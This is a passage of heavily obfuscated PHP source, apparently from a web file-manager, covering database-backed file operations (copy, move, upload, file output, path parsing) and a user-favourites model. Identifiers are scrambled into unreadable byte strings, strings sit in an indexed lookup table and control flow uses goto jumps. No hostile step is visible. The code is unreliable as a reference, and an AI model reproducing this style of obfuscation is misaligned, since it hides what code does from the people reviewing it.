$D¡èî∫‰·≈, $E†å·µµÀÿ[1091] => base64_encode($Dóßñ∂É‰Ì), $E†å·µµÀÿ[1088] => $BÛ’≈ùé§ä, $E†å·µµÀÿ[1089] => $this->accessKey, $E†å·µµÀÿ[1092] => $dˆÛ√Í¡Û£, $E†å·µµÀÿ[1093] => $f„îπ©œ‡˘, $E†å·µµÀÿ[176] => $this->getHost()); goto FÇ…èâüé”; DÌ§íÊÆåÕ: } public function fileOutLink($CœõØÇëìô) { $FÏ°√Â „Ó =& $_SERVER[Æ¡î¢≠¯™]; if (substr($CœõØÇëìô, 0, 7) == $FÏ°√Â „Ó[1094]) { $CœõØÇëìô = $FÏ°√Â „Ó[1095] . substr($CœõØÇëìô, 7); } header($FÏ°√Â „Ó[163] . $CœõØÇëìô); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Cˆ§Öü–È´) { $this->pathParse = $Cˆ§Öü–È´; $this->model = Model($_SERVER[Æ¡î¢≠¯™][1096]); } public function getPath($cÀ´‡Öç—±) { return trim($cÀ´‡Öç—±, $_SERVER[Æ¡î¢≠¯™][8]); } public function pathFather($e»Öı”⁄‘©) { $FùÕæ›   = $this->parse($e»Öı”⁄‘©); $FùÕæ›   = $this->infoSimple($e»Öı”⁄‘©); return $FùÕæ›   ? $FùÕæ›  [$_SERVER[Æ¡î¢≠¯™][465]] : !1; } public function getPathName($F§€ëﬂ¥ûØ) { $D√¶éŸä≈å = $this->infoSimple($F§€ëﬂ¥ûØ); return $D√¶éŸä≈å ? $D√¶éŸä≈å[$_SERVER[Æ¡î¢≠¯™][28]] : !1; } public function getPathOuter($béÀ¡ú≈Íò) { if (!$béÀ¡ú≈Íò) { return $béÀ¡ú≈Íò; } $b–€‰˜†£© = $this->parse($béÀ¡ú≈Íò); return KodIO::make($b–€‰˜†£©[$_SERVER[Æ¡î¢≠¯™][372]]); } public function copyFolderFromIO($a⁄àÑÉÁû—, $D≠®€ª¿£“, $d–»ß·‹å§, $bÑÍƒÉé∑µ, $aÈ ••‘Î∂) { $BºÖƒÎù√Ï = $this->model->copyFolderFromIO($a⁄àÑÉÁû—, $D≠®€ª¿£“, $d–»ß·‹å§, $bÑÍƒÉé∑µ, $aÈ ••‘Î∂); return KodIO::make($BºÖƒÎù√Ï); } public function isParentOf($fè∂Èﬂ≤Ëó, $Aä¿Õî«Øû) { return $this->model->isParentOf($fè∂Èﬂ≤Ëó, $Aä¿Õî«Øû); } public function mkfile($b∫¶é˘—Îá, $bÌªˆµ•òò = '', $aÌÔñÊçÎ§ = REPEAT_RENAME) { $A¬‡õ±ô…≈ =& $_SERVER[Æ¡î¢≠¯™]; $E™Õ⁄ù©çË = $this->parse($b∫¶é˘—Îá); $b∫¶é˘—Îá = $E™Õ⁄ù©çË[$A¬‡õ±ô…≈[372]]; for ($d¥≤††‰⁄ó = 0; $d¥≤††‰⁄ó < count($E™Õ⁄ù©çË[$A¬‡õ±ô…≈[1097]]); $d¥≤††‰⁄ó++) { $DÛûçëøì… = $E™Õ⁄ù©çË[$A¬‡õ±ô…≈[1097]][$d¥≤††‰⁄ó]; if ($d¥≤††‰⁄ó == count($E™Õ⁄ù©çË[$A¬‡õ±ô…≈[1097]]) - 1) { $b∫¶é˘—Îá = $this->model->mkfile($b∫¶é˘—Îá, $DÛûçëøì…, $bÌªˆµ•òò, $aÌÔñÊçÎ§); break; } $b∫¶é˘—Îá = $this->model->mkdir($b∫¶é˘—Îá, $DÛûçëøì…, REPEAT_SKIP); } return $this->getPathOuter($b∫¶é˘—Îá); } public function mkdir($C¢©≠ö›ﬂº, $cÚÑÌé„åÉ = REPEAT_SKIP) { $fÀ©ˆøß◊÷ =& $_SERVER[Æ¡î¢≠¯™]; $a‘ﬂ∆¶ÈÀï = $this->parse($C¢©≠ö›ﬂº); $C¢©≠ö›ﬂº = $a‘ﬂ∆¶ÈÀï[$fÀ©ˆøß◊÷[372]]; for ($F¬·öﬁÊü• = 0; $F¬·öﬁÊü• < count($a‘ﬂ∆¶ÈÀï[$fÀ©ˆøß◊÷[1097]]); $F¬·öﬁÊü•++) { $eÚ£Ã¢Ôï° = $a‘ﬂ∆¶ÈÀï[$fÀ©ˆøß◊÷[1097]][$F¬·öﬁÊü•]; $C¢©≠ö›ﬂº = $this->model->mkdir($C¢©≠ö›ﬂº, $eÚ£Ã¢Ôï°, $cÚÑÌé„åÉ); } return $this->getPathOuter($C¢©≠ö›ﬂº); } public function copyFile($aáÁÂÑèÁ¨, $Aæ´õ…•≤°, $fÊ’À”ìΩŒ = REPEAT_REPLACE) { $E€ò≠°‰À€ =& $_SERVER[Æ¡î¢≠¯™]; $AñÀÀÑÛâÎ = $this->parse($Aæ´õ…•≤°); $D≤µìç¯√ã = $this->model->copy($aáÁÂÑèÁ¨, $AñÀÀÑÛâÎ[$E€ò≠°‰À€[372]], $fÊ’À”ìΩŒ, $AñÀÀÑÛâÎ[$E€ò≠°‰À€[85]]); return $D≤µìç¯√ã ? $this->getPathOuter($D≤µìç¯√ã) : !1; } public function moveFile($dÛëÊÖÚ∂Ö, $bé¬ÎÆÊ¥µ, $f«ÿ∆çÁ”É = REPEAT_REPLACE) { $b⁄ñ“ßßÊÏ =& $_SERVER[Æ¡î¢≠¯™]; $aÎ í§à∑˜ = $this->parse($bé¬ÎÆÊ¥µ); $Bƒ≥ƒ…êõÇ = $this->model->move($dÛëÊÖÚ∂Ö, $aÎ í§à∑˜[$b⁄ñ“ßßÊÏ[372]], $f«ÿ∆çÁ”É, $aÎ í§à∑˜[$b⁄ñ“ßßÊÏ[85]]); return $Bƒ≥ƒ…êõÇ ? $this->getPathOuter($Bƒ≥ƒ…êõÇ) : !1; } public function copy($dµ÷ê§Øıê, $D∫«ËâŒÙ¬, $aìŒﬁÖ‹Ñé = REPEAT_REPLACE) { $f¯‹∑ê«±≈ = $this->parse($D∫«ËâŒÙ¬); $bâ™°Ãùü˘ = $this->model->copy($dµ÷ê§Øıê, $f¯‹∑ê«±≈[$_SERVER[Æ¡î¢≠¯™][372]], $aìŒﬁÖ‹Ñé); return $bâ™°Ãùü˘ ? $this->getPathOuter($bâ™°Ãùü˘) : !1; } public function move($F“æáÍàÿº, $F««Üõà ∫, $d≈—Ê‡õöΩ = REPEAT_REPLACE) { $B„¬ˆ£àˆ— = $this->parse($F««Üõà ∫); $FîÃ≈ì‚µù = $this->model->move($F“æáÍàÿº, $B„¬ˆ£àˆ—[$_SERVER[Æ¡î¢≠¯™][372]], $d≈—Ê‡õöΩ); return $FîÃ≈ì‚µù ? $this->getPathOuter($FîÃ≈ì‚µù) : !1; } public function remove($aá˜ˆè‰‡ï, $d±™ÕÖŸöç = true) { return $this->model->remove($aá˜ˆè‰‡ï, $d±™ÕÖŸöç); } public function rename($Dõ„Ç›ˆ∞‹, $F¥°’éå‰¶) { $C◊˜ìÊîõ∏ = $this->model->rename($Dõ„Ç›ˆ∞‹, $F¥°’éå‰¶); return $C◊˜ìÊîõ∏ ? $this->getPathOuter($Dõ„Ç›ˆ∞‹) : $C◊˜ìÊîõ∏; } public function size($Cüë£äú÷è) { $FÖŒù◊∫≈ë = $this->infoSimple($Cüë£äú÷è); return $FÖŒù◊∫≈ë ? $FÖŒù◊∫≈ë[$_SERVER[Æ¡î¢≠¯™][87]] : 0; } public function infoSimple($d®êâ«ÊÒê) { return $this->model->sourceInfo($d®êâ«ÊÒê); } public function info($c´“≠‚¨äû) { return $this->infoParse($c´“≠‚¨äû); } public function infoAuth($Bª£ﬁà≈ÿ⁄) { return $this->infoParse($Bª£ﬁà≈ÿ⁄, !1, !0); } public function infoWithChildren($Dáë±Ú·ıﬂ) { return $this->infoParse($Dáë±Ú·ıﬂ, !0); } protected function infoParse($eÑ†ì¬ÖÖé, $FËﬁäıû¯è = false, $A¨¨ëà•⁄ = false) { if (!$FËﬁäıû¯è) { return $this->model->pathInfo($eÑ†ì¬ÖÖé, $A¨¨ëà•⁄); } return $this->model->pathInfoMore($eÑ†ì¬ÖÖé); } public function infoFull($E±±≈Ò—∆π) { $fûö¿ëçç· =& $_SERVER[Æ¡î¢≠¯™]; $f¶ì√‚‚¥† = explode($fûö¿ëçç·[8], $E±±≈Ò—∆π); $F“≤üöÍ≠  = implode($fûö¿ëçç·[8], array_splice($f¶ì√‚‚¥†, 1)); return $this->model->pathInfoByPath($f¶ì√‚‚¥†[0], $F“≤üöÍ≠ ); } public function hashSimple($cã˘ûÉ¿Ôó) { $aÕ¥–†¥ºì =& $_SERVER[Æ¡î¢≠¯™]; $Fè‚≤£‡ì® = $this->infoWithChildren($cã˘ûÉ¿Ôó); return $Fè‚≤£‡ì®[$aÕ¥–†¥ºì[169]][$aÕ¥–†¥ºì[171]]; } public function hashMd5($E€å„Çàî‘) { $BÔïµÓ’Ÿü =& $_SERVER[Æ¡î¢≠¯™]; $BΩáäÉ£∫ = $this->infoWithChildren($E€å„Çàî‘); return $BΩáäÉ£∫[$BÔïµÓ’Ÿü[169]][$BÔïµÓ’Ÿü[170]]; } public function exist($EåˆÑ»ÿèç) { $AÁÜüûÁªè =& $_SERVER[Æ¡î¢≠¯™]; $fÌáù≤◊ªø = $this->parse($EåˆÑ»ÿèç); if (!$fÌáù≤◊ªø[$AÁÜüûÁªè[85]]) { return $this->isFile($EåˆÑ»ÿèç) || $this->isFolder($EåˆÑ»ÿèç); } $Açœó…Ïéå = array($AÁÜüûÁªè[373] => $fÌáù≤◊ªø[$AÁÜüûÁªè[372]], $AÁÜüûÁªè[28] => $fÌáù≤◊ªø[$AÁÜüûÁªè[85]]); $F¢‚Ÿ¨ïß† = $this->model->where($Açœó…Ïéå)->find(); return $F¢‚Ÿ¨ïß† ? !0 : !1; } public function isFile($fÜŒß€âá£) { $E÷ÁÂ“Îãˆ =& $_SERVER[Æ¡î¢≠¯™]; $eâëŸŸ–ö = $this->infoSimple($fÜŒß€âá£); return $eâëŸŸ–ö && $eâëŸŸ–ö[$E÷ÁÂ“Îãˆ[375]] == $E÷ÁÂ“Îãˆ[93] ? !1 : !0; } public function isFolder($eçÇÇﬁ‡÷â) { $aÂø∂èåøå =& $_SERVER[Æ¡î¢≠¯™]; $cÏ“Ûú°¶◊ = $this->infoSimple($eçÇÇﬁ‡÷â); return $cÏ“Ûú°¶◊ && $cÏ“Ûú°¶◊[$aÂø∂èåøå[375]] == $aÂø∂èåøå[93] ? !0 : !1; } public function listPath($aÁè°∞ÈÒƒ, $bù›Ï¢∞—™ = false) { $Eøä’õ∂¨Ù =& $_SERVER[Æ¡î¢≠¯™]; if ($aÁè°∞ÈÒƒ == $Eøä’õ∂¨Ù[33]) { return !1; } $dÈº®Õâéõ = array($Eøä’õ∂¨Ù[373] => $aÁè°∞ÈÒƒ); if ($bù›Ï¢∞—™) { return $this->model->listSource($dÈº®Õâéõ, -1); } return $this->model->listSource($dÈº®Õâéõ); } public function has($dˆëç‹íÎŒ, $Aê€•≤û∞ì = false, $FêäÀç¬÷™ = null) { $aôÃÁ⁄—Êƒ =& $_SERVER[Æ¡î¢≠¯™]; $bÆá¡‡ÆÆπ = $this->infoWithChildren($dˆëç‹íÎŒ); if ($Aê€•≤û∞ì) { return array($aôÃÁ⁄—Êƒ[199] => $bÆá¡‡ÆÆπ[$aôÃÁ⁄—Êƒ[199]], $aôÃÁ⁄—Êƒ[198] => $bÆá¡‡ÆÆπ[$aôÃÁ⁄—Êƒ[198]]); } return $FêäÀç¬÷™ ? $bÆá¡‡ÆÆπ[$aôÃÁ⁄—Êƒ[199]] : $bÆá¡‡ÆÆπ[$aôÃÁ⁄—Êƒ[198]]; } public function listAll($F√ïª¡≤¥ﬂ) { $f‡‹©ÿúÓ≤ = IO::info($this->pathParse[$_SERVER[Æ¡î¢≠¯™][85]]); if (!$f‡‹©ÿúÓ≤) { return array(); } return $this->model->listAll($F√ïª¡≤¥ﬂ); } public function getContent($c’‚Ü†»…Ö) { return $this->model->getContent($c’‚Ü†»…Ö); } public function setContent($e›Ï¿¬’¡ª, $Añ≠ú¡„àî = '') { return $this->model->setContent($e›Ï¿¬’¡ª, $Añ≠ú¡„àî); } public function fileSubstr($f¿ë¨ÿçûë, $e´üÉ•≈µ„, $e÷∆÷¯¶πë) { return $this->model->fileSubstr($f¿ë¨ÿçûë, $e´üÉ•≈µ„, $e÷∆÷¯¶πë); } public function download($f›‘≈“ùèâ, $Dæœ≥Ô≠©ó = '') { $A∑èÈí¯Ÿ = get_path_father($Dæœ≥Ô≠©ó); $CËùÌ∞è¢¥ = get_path_this($Dæœ≥Ô≠©ó); $DÕÿ•Üë≠ü = $this->model->fileInfoGet($f›‘≈“ùèâ); $cïúÜ≤Æéâ = IO::copy($DÕÿ•Üë≠ü[$_SERVER[Æ¡î¢≠¯™][85]], $A∑èÈí¯Ÿ, !1, $CËùÌ∞è¢¥); return $cïúÜ≤Æéâ; } public function upload($fÏç¿ë»‡ƒ, $D¯ö…â—ç‚, $e◊ÖÀÉÌÛõ = false, $B”îË™ãÛπ = REPEAT_REPLACE) { $b≥ëˆ§ﬁ…• =& $_SERVER[Æ¡î¢≠¯™]; $Cº“·Ãññã = $this->parse($fÏç¿ë»‡ƒ); $có‰†ŒÇ»ì = $this->model->addFile($Cº“·Ãññã[$b≥ëˆ§ﬁ…•[372]], $D¯ö…â—ç‚, $Cº“·Ãññã[$b≥ëˆ§ﬁ…•[85]], $e◊ÖÀÉÌÛõ, $B”îË™ãÛπ); return $this->getPathOuter($có‰†ŒÇ»ì); } public function uploadFileByID($fÿœ∆îÔœÉ, $FøçÜ¬Øòú, $AÛŒ†Öç⁄¥) { $B˘«¬ËØ∏é =& $_SERVER[Æ¡î¢≠¯™]; $DàêÒè”âé = $this->parse($fÿœ∆îÔœÉ); $Bæó≈ÛÁü• = $this->model->addFileByFileID($DàêÒè”âé[$B˘«¬ËØ∏é[372]], $FøçÜ¬Øòú, $DàêÒè”âé[$B˘«¬ËØ∏é[85]], $AÛŒ†Öç⁄¥); return $this->getPathOuter($Bæó≈ÛÁü•); } public function addFileByRemote($fﬁÈàüË∆«, $bÔ±«çœ≤÷, $BöºÜúæã© = array(), $cõ”¨ø™Éﬂ = '', $cÇ±‚Ëïà≤) { $FıåÛÊ·ä‡ =& $_SERVER[Æ¡î¢≠¯™]; $fÉí√ü›Ì˜ = $this->parse($fﬁÈàüË∆«); $cõ”¨ø™Éﬂ = empty($cõ”¨ø™Éﬂ) ? $fÉí√ü›Ì˜[$FıåÛÊ·ä‡[85]] : $cõ”¨ø™Éﬂ; $a•ÈØ“áÇ∑ = $this->model->addFileByRemote($fÉí√ü›Ì˜[$FıåÛÊ·ä‡[372]], $bÔ±«çœ≤÷, $cõ”¨ø™Éﬂ, $BöºÜúæã©, $cÇ±‚Ëïà≤); return $this->getPathOuter($a•ÈØ“áÇ∑); } public function uploadLink($eàíÔ±≥öú, $cá•öπ¥Øì = 0) { $d≠…™¶ÑÆ• =& $_SERVER[Æ¡î¢≠¯™]; $E•Üà‹É÷ä = $this->parse($eàíÔ±≥öú); $eàíÔ±≥öú = Model($d≠…™¶ÑÆ•[548])->createFileName($E•Üà‹É÷ä[$d≠…™¶ÑÆ•[85]]); $F≈∆∫Ñ · = IO::uploadLink($eàíÔ±≥öú, $cá•öπ¥Øì); return $F≈∆∫Ñ ·; } public function fileNameAuto($a∂…Âºèãå, $C’É”∫◊À¬, $DéΩ‰’⁄ó∆ = REPEAT_REPLACE, $B›ﬁ¿ááˆ« = false) { return $this->model->fileNameAuto($a∂…Âºèãå, $C’É”∫◊À¬, $DéΩ‰’⁄ó∆, $B›ﬁ¿ááˆ«); } public function fileNameExist($EôÃ—≥•“, $C™∆∫ÚÑü…) { return $this->model->fileNameExist($EôÃ—≥•“, $C™∆∫ÚÑü…); } protected function _fileOut($D¢ç⁄ö§ôñ, $EØ›í»∫´´ = false, $cÉà≈£∂æï = false, $E®¡“Üª„∑ = '', $fî‘ï‚∫Ñä = false) { goto EßêÜÕ¨÷Ü; Fµ¨ı°â„Ú: $bè‡‘≈ß√ª = $this->model->fileInfoGet($D¢ç⁄ö§ôñ); $E®¡“Üª„∑ = $bè‡‘≈ß√ª[$BÚÕ†∑úÑ‚[170]] ? $bè‡‘≈ß√ª[$BÚÕ†∑úÑ‚[170]] : $E®¡“Üª„∑; $Dç’öø·éΩ = isset($GLOBALS[$BÚÕ†∑úÑ‚[1099]]) ? $GLOBALS[$BÚÕ†∑úÑ‚[1099]] : $E±ã∞ŒïÌÑ[$BÚÕ†∑úÑ‚[28]]; goto aêï«–ëÔ¶; aêï«–ëÔ¶: if ($fî‘ï‚∫Ñä) { return IO::fileOutServer($bè‡‘≈ß√ª[$BÚÕ†∑úÑ‚[85]], $EØ›í»∫´´, $Dç’öø·éΩ, $E®¡“Üª„∑); } IO::fileOut($bè‡‘≈ß√ª[$BÚÕ†∑úÑ‚[85]], $EØ›í»∫´´, $Dç’öø·éΩ, $E®¡“Üª„∑); goto Fˆ»∫ŸÃ√‡; EßêÜÕ¨÷Ü: $BÚÕ†∑úÑ‚ =& $_SERVER[Æ¡î¢≠¯™]; $E±ã∞ŒïÌÑ = $this->model->sourceInfo($D¢ç⁄ö§ôñ); if ($E±ã∞ŒïÌÑ[$BÚÕ†∑úÑ‚[375]] == $BÚÕ†∑úÑ‚[93]) { header($BÚÕ†∑úÑ‚[1098]); die; } goto Fµ¨ı°â„Ú; Fˆ»∫ŸÃ√‡: } public function fileOut($déÙ©–˘∑Ë, $D∂»◊Üƒ¬Î = false, $fÆ®†´ù¬≠ = false, $d«äòâÜ∞‚ = '') { $this->_fileOut($déÙ©–˘∑Ë, $D∂»◊Üƒ¬Î, $fÆ®†´ù¬≠, $d«äòâÜ∞‚); } public function fileOutServer($E≤º¢ùÏ˜Ô, $a—ë≈Üá«ü = false, $e®ô¨âáâÁ = false, $F·Éä†∆Á∑ = '') { $this->_fileOut($E≤º¢ùÏ˜Ô, $a—ë≈Üá«ü, $e®ô¨âáâÁ, $F·Éä†∆Á∑, !0); } protected function _fileOutImage($dØÛé…´Ú”, $Cçèÿô€€∫ = 250) { $B˘úÌÜåã€ =& $_SERVER[Æ¡î¢≠¯™]; $eﬂﬁﬂé—òå = $this->model->sourceInfo($dØÛé…´Ú”); if ($eﬂﬁﬂé—òå[$B˘úÌÜåã€[375]] == $B˘úÌÜåã€[93]) { show_json($B˘úÌÜåã€[1100] . $dØÛé…´Ú”, !1); } $GLOBALS[$B˘úÌÜåã€[1099]] = $eﬂﬁﬂé—òå[$B˘úÌÜåã€[28]]; $f¥íäÉËº» = $this->model->fileInfoGet($dØÛé…´Ú”); IO::fileOutImage($f¥íäÉËº»[$B˘úÌÜåã€[85]], $Cçèÿô€€∫); } public function fileOutImage($f÷ÌèÉøé, $E…Ì¨©≥œû = 250) { $this->_fileOutImage($f÷ÌèÉøé, $E…Ì¨©≥œû); } public function fileOutImageServer($a±¯ßﬂ†Òû, $CÆû›ÒŸÉÒ = 250) { $this->_fileOutImage($a±¯ßﬂ†Òû, $CÆû›ÒŸÉÒ); } public function link($eÚ∂î∑ÑûÇ, $aƒ’∏€Œ√ñ = '') { $f™ùõ¥ìïØ = $this->model->fileInfoGet($eÚ∂î∑ÑûÇ); return IO::link($f™ùõ¥ìïØ[$_SERVER[Æ¡î¢≠¯™][85]], $aƒ’∏€Œ√ñ); } protected function parse($aéï˜ﬁå) { $c√„⁄òñÂ‰ =& $_SERVER[Æ¡î¢≠¯™]; if (strstr($aéï˜ﬁå, $c√„⁄òñÂ‰[8]) === !1) { return array($c√„⁄òñÂ‰[390] => intval($aéï˜ﬁå), $c√„⁄òñÂ‰[85] => $c√„⁄òñÂ‰[33], $c√„⁄òñÂ‰[1097] => array()); } $e◊äÉâ∂•ì = explode($c√„⁄òñÂ‰[8], trim($aéï˜ﬁå, $c√„⁄òñÂ‰[8])); if (count($e◊äÉâ∂•ì) < 2) { show_tips($aéï˜ﬁå . $c√„⁄òñÂ‰[1101]); } return array($c√„⁄òñÂ‰[390] => intval($e◊äÉâ∂•ì[0]), $c√„⁄òñÂ‰[85] => $e◊äÉâ∂•ì[1], $c√„⁄òñÂ‰[1097] => array_slice($e◊äÉâ∂•ì, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($a—œë€õÖ€) { $this->pathParse = $a—œë€õÖ€; $this->model = Model($_SERVER[Æ¡î¢≠¯™][1096]); } public function getPathOuter($D–äïÙÇË§) { $FÚﬁÆÑ≈÷” =& $_SERVER[Æ¡î¢≠¯™]; if (!$D–äïÙÇË§) { return $D–äïÙÇË§; } $AåòöÕé“î = $this->parse($D–äïÙÇË§); return trim(KodIO::makeShare($this->pathParse[$FÚﬁÆÑ≈÷”[372]], $AåòöÕé“î[$FÚﬁÆÑ≈÷”[372]]), $FÚﬁÆÑ≈÷”[8]); } protected function infoParse($d„ßÇ¢®‹…, $F†≤å®Ûƒ⁄ = false, $e⁄¨ÁÓÈ≈õ = false) { $FÓå÷˘‘ëí =& $_SERVER[Æ¡î¢≠¯™]; $D¿Üáì°å¢ = $this->pathParse[$FÓå÷˘‘ëí[372]]; $CÎ≠‹∫©Èí = trim($this->pathParse[$FÓå÷˘‘ëí[997]], $FÓå÷˘‘ëí[8]); return Action($FÓå÷˘‘ëí[1102])->sharePathInfo($D¿Üáì°å¢, $CÎ≠‹∫©Èí); } public function infoFull($E›‰ŒáπÏí) { $F≤‹£Ωà£å =& $_SERVER[Æ¡î¢≠¯™]; $BÎ…Ôœßê’ = explode($F≤‹£Ωà£å[8], trim($E›‰ŒáπÏí, $F≤‹£Ωà£å[8])); if (count($BÎ…Ôœßê’) > 1) { $BﬁÃ∏Éß∑˘ = implode($F≤‹£Ωà£å[8], array_splice($BÎ…Ôœßê’, 1)); $b¨ß¨Ò¯æê = $this->model->pathInfoByPath($BÎ…Ôœßê’[0], $BﬁÃ∏Éß∑˘); if (!$b¨ß¨Ò¯æê) { return !1; } $this->pathParse[$F≤‹£Ωà£å[997]] = $b¨ß¨Ò¯æê[$F≤‹£Ωà£å[374]]; } return $this->infoParse($E›‰ŒáπÏí); } public function listAll($a•Éã©é) { goto BÃ§ÉÜıÈŸ; bë£´ƒ◊÷è: foreach ($f¢¶ó–∞ë´ as &$eæ¶´ù≠‘é) { check_abort(); $eæ¶´ù≠‘é[$F£œÜåé⁄Ω[396]] = $B∏”Ã£•ÿœ->_shareItemeParse($eæ¶´ù≠‘é[$F£œÜåé⁄Ω[396]], $e ¬ûê±›Á); } return $f¢¶ó–∞ë´; goto dÊìÏûÙæâ; b®£Á·∞æ⁄: $f¢¶ó–∞ë´ = $this->model->listAll($a•Éã©é); $e ¬ûê±›Á = Model($F£œÜåé⁄Ω[540])->getInfo($E›É›ÀîØÛ[$F£œÜåé⁄Ω[445]]); $B∏”Ã£•ÿœ = Action($F£œÜåé⁄Ω[1102]); goto bë£´ƒ◊÷è; BÃ§ÉÜıÈŸ: $F£œÜåé⁄Ω =& $_SERVER[Æ¡î¢≠¯™]; $E›É›ÀîØÛ = IO::info($this->pathParse[$F£œÜåé⁄Ω[85]]); if (!$E›É›ÀîØÛ) { return array(); } goto b®£Á·∞æ⁄; dÊìÏûÙæâ: } } goto cç—Û ì‘å; d„” ∂òÑ≠: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($Båæ≈›Üµµ) { $còèÓËâù˜ =& $_SERVER[Æ¡î¢≠¯™]; return array($còèÓËâù˜[2432] => array(USER_ID, $còèÓËâù˜[2433])); } protected function listData() { $F∫ä¡Ô“¥ã =& $_SERVER[Æ¡î¢≠¯™]; $cÙ¥®¯‰ú = array($F∫ä¡Ô“¥ã[1388] => USER_ID, $F∫ä¡Ô“¥ã[440] => 0); $Eìí≤⁄ÛÊã = $F∫ä¡Ô“¥ã[2434]; $B¬¥’ÏÁï¢ = $this->field($Eìí≤⁄ÛÊã)->where($cÙ¥®¯‰ú)->order($F∫ä¡Ô“¥ã[2435])->select(); return $B¬¥’ÏÁï¢ ? $B¬¥’ÏÁï¢ : array(); } protected function resetCache() { } protected function listView() { goto AáËÎü≠î”; AáËÎü≠î”: $aàú∫î˘† =& $_SERVER[Æ¡î¢≠¯™]; $F€ãÔõºè˜ = $this->listData(); $D≈ä€Ç£›ê = array_filter_by_field($F€ãÔõºè˜, $aàú∫î˘†[29], $aàú∫î˘†[387]); goto B™∫Ã√œã∫; B◊ú•ÎÒ∆–: $dïÑ¡ë¬·ç = array($aàú∫î˘†[388] => array($aàú∫î˘†[389], $EΩ∞†ˆÏê≠)); $C«·´Ë®¡• = Model($aàú∫î˘†[744])->listSource($dïÑ¡ë¬·ç, $dö›ñ∆âıç); $C«·´Ë®¡• = array_merge($C«·´Ë®¡•[$aàú∫î˘†[83]], $C«·´Ë®¡•[$aàú∫î˘†[84]]); goto F—®Õ¬—ãé; B™∫Ã√œã∫: $EΩ∞†ˆÏê≠ = array_to_keyvalue($D≈ä€Ç£›ê, $aàú∫î˘†[33], $aàú∫î˘†[85]); if (!$EΩ∞†ˆÏê≠) { return $F€ãÔõºè˜; } $dö›ñ∆âıç = 2000; goto B◊ú•ÎÒ∆–; F—®Õ¬—ãé: $C«·´Ë®¡• = array_to_keyvalue($C«·´Ë®¡•, $aàú∫î˘†[374]); foreach ($F€ãÔõºè˜ as $aÜ∞…’∂Û© => $EÉ”∆ ‘µØ) { $D€‡®Ãùô∏ = $C«·´Ë®¡•[$EÉ”∆ ‘µØ[$aàú∫î˘†[85]]]; $D€‡®Ãùô∏ = $D€‡®Ãùô∏ ? $D€‡®Ãùô∏ : array(); $F€ãÔõºè˜[$aÜ∞…’∂Û©] = array_merge($D€‡®Ãùô∏, $EÉ”∆ ‘µØ); } return $F€ãÔõºè˜; goto Dåñ¬«Àª‡; Dåñ¬«Àª‡: } protected function addFav($Cß»£ä•÷¢, $C∆ì†û®ÖÕ = '', $fı«óå—∂æ = "\x73\157\165\162\143\145") { goto Fí—©Á∆ÿÏ; A∂ïÜ„âà™: if (!$C∆ì†û®ÖÕ && $fı«óå—∂æ == $Fä≠ûÊÇÙÆ[387]) { $C‡ª‡ìúáÎ = Model($Fä≠ûÊÇÙÆ[1096])->where(array($Fä≠ûÊÇÙÆ[388] => $Cß»£ä•÷¢))->find(); if (!$C‡ª‡ìúáÎ) { return !1; } $C∆ì†û®ÖÕ = $C‡ª‡ìúáÎ[$Fä≠ûÊÇÙÆ[28]]; } $C∆ì†û®ÖÕ = $this->getAutoName($C∆ì†û®ÖÕ); $Bò‚ç›íŒÿ = array($Fä≠ûÊÇÙÆ[1388] => USER_ID, $Fä≠ûÊÇÙÆ[440] => 0, $Fä≠ûÊÇÙÆ[391] => $C∆ì†û®ÖÕ, $Fä≠ûÊÇÙÆ[392] => $Cß»£ä•÷¢, $Fä≠ûÊÇÙÆ[393] => $fı«óå—∂æ, $Fä≠ûÊÇÙÆ[2065] => $CÜÓñØ◊–à + 1); goto cª∫ãÜÔ∞ë; AŒÉá≈öö´: $dáìƒá¬éû = array($Fä≠ûÊÇÙÆ[1388] => USER_ID, $Fä≠ûÊÇÙÆ[440] => 0); $CÜÓñØ◊–à = $this->where($dáìƒá¬éû)->max($Fä≠ûÊÇÙÆ[2082]); if (!$CÜÓñØ◊–à) { $CÜÓñØ◊–à = 0; } goto A∂ïÜ„âà™; Fí—©Á∆ÿÏ: $Fä≠ûÊÇÙÆ =& $_SERVER[Æ¡î¢≠¯™]; $dáìƒá¬éû = array($Fä≠ûÊÇÙÆ[1388] => USER_ID, $Fä≠ûÊÇÙÆ[440] => 0, $Fä≠ûÊÇÙÆ[393] => $fı«óå—∂æ, $Fä≠ûÊÇÙÆ[392] => $Cß»£ä•÷¢); if ($this->where($dáìƒá¬éû)->find()) { return !1; } goto AŒÉá≈öö´; cª∫ãÜÔ∞ë: return $this->add($Bò‚ç›íŒÿ); goto E√…©Øä©Û; E√…©Øä©Û: } protected function remove($b¡µÓ’ù‡«) { $Cıƒìâ‹¯å =& $_SERVER[Æ¡î¢≠¯™]; $c´ÉØïËâ´ = array($Cıƒìâ‹¯å[1388] => USER_ID, $Cıƒìâ‹¯å[390] => $b¡µÓ’ù‡«); return $this->where($c´ÉØïËâ´)->delete(); } protected function removeByName($eÜáÌÖÊ€ñ) { $C∑õä§óÒ⁄ =& $_SERVER[Æ¡î¢≠¯™]; $F€àﬂóÉº≤ = array($C∑õä§óÒ⁄[1388] => USER_ID, $C∑õä§óÒ⁄[391] => $eÜáÌÖÊ€ñ, $C∑õä§óÒ⁄[440] => 0); return $this->where($F€àﬂóÉº≤)->delete(); } protected function rename($bõèË∏·íé, $b´•∫Ú—Ç») { $Eã çò„á÷ =& $_SERVER[Æ¡î¢≠¯™]; if ($bõèË∏·íé == $b´•∫Ú—Ç») { return !1; } $A◊ ñé‰†© = $this->getAutoName($b´•∫Ú—Ç»); if ($b´•∫Ú—Ç» != $A◊ ñé‰†©) { return !1; } $bÑ£Á¶óç = array($Eã çò„á÷[1388] => USER_ID, $Eã çò„á÷[440] => 0, $Eã çò„á÷[28] => $bõèË∏·íé); return $this->where($bÑ£Á¶óç)->save(array($Eã çò„á÷[28] => $b´•∫Ú—Ç»)); } protected function resetSort($eﬁîô©Ωáﬂ) { $eüÃç¢≈äµ =& $_SERVER[Æ¡î¢≠¯™]; $eﬁîô©Ωáﬂ = is_array($eﬁîô©Ωáﬂ) ? $eﬁîô©Ωáﬂ : array(); $dı∞‡Ç—‹í = array($eüÃç¢≈äµ[1388] => USER_ID); for ($bñ£˘éÉ¯∏ = 0; $bñ£˘éÉ¯∏ < count($eﬁîô©Ωáﬂ); $bñ£˘éÉ¯∏++) { $dı∞‡Ç—‹í[$eüÃç¢≈äµ[390]] = 